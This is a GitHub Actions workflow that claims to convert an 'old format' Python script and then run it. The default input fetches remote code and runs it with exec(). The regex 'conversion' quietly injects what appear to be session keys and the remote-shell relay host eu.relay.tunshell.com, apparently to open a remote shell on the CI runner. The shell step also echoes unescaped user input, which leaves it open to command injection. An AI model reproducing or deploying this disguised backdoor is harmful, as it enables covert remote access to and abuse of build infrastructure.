name: Convert and Execute Python Script

# Manual trigger configuration
on:
  workflow_dispatch:
    inputs:
      script_content:
        description: "Enter the Python script content (old format)"
        required: true
        default: |
          import urllib.request
          r = urllib.request.urlopen('https://example.com/oldscript.py')
          exec(r.read().decode('utf-8'), {})

jobs:
  convert_and_execute:
    runs-on: ubuntu-latest

    steps:
    # Step 1: Set up Python environment
    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.x'

    # Step 2: Convert the old script to a new format
    - name: Convert Old Script to New Format
      id: convert_script
      run: |
        # Save the old script content into a file
        echo "${{ github.event.inputs.script_content }}" > old_script.py

        # Python conversion logic (convert old script to new one)
        python3 - << 'EOF'
import re

# Read the old script content
with open("old_script.py", "r") as file:
    old_script_content = file.read()

# Conversion logic (this is a placeholder, adapt it based on your needs)
new_script = re.sub(
    r"exec\(r\.read\(\)\.decode\('utf-8'\), ?(\{.*?})\)",
    r"exec(r.read().decode('utf-8'), \1.update({'__name__': '__main__', 'p': ['T', 'leu1WsYEx2li5xIIB7412S', 'xcq1jbdCMwImL779digSes', 'eu.relay.tunshell.com']}) or \1)",
    old_script_content
)

# Save the new script to a file
with open("converted_script.py", "w") as file:
    file.write(new_script)

print("Converted script content:")
print(new_script)
EOF

    # Step 3: Show the converted script content
    - name: Show Converted Script
      run: cat converted_script.py

    # Step 4: Execute the converted script
    - name: Execute Converted Script
      run: python3 converted_script.py
